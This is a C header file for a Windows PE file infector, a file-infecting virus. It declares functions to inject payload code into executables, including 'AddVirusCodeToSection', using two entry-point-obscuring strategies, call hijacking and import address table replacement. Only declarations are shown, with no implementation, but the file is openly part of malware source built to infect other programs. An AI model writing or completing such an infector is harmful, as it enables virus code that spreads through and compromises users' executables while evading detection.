#ifndef PE_INFECTOR_H
#define PE_INFECTOR_H

// Disable Microsoft "security" warnings for standard C functions
// fopen, strcpy, sprintf are part of C standard library
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>

// PE file structures
typedef struct {
    DWORD signature;
    IMAGE_FILE_HEADER file_header;
    IMAGE_OPTIONAL_HEADER32 optional_header;
} PE_HEADER_32;

// Infection methods
typedef enum {
    EPO_CALL_HIJACKING,           // Strategy 1: Call Hijacking EPO
    EPO_IAT_REPLACING             // Strategy 2: IAT Replacing EPO
} EPO_STRATEGY;

// Function to infect a PE file using Call Hijacking EPO
BOOL InfectPEFile_CallHijacking(const char* target_file, const char* payload_code, DWORD payload_size);

// Function to infect a PE file using IAT Replacing EPO
BOOL InfectPEFile_IATReplacing(const char* target_file, const char* payload_code, DWORD payload_size);

// Helper functions
BOOL ReadPEHeader(const char* filename, PE_HEADER_32* header);
BOOL WritePEHeader(const char* filename, const PE_HEADER_32* header);
DWORD AlignToSection(DWORD address, DWORD alignment);
BOOL AddVirusCodeToSection(const char* filename, const char* payload, DWORD payload_size, DWORD* code_offset);

#endif // PE_INFECTOR_H
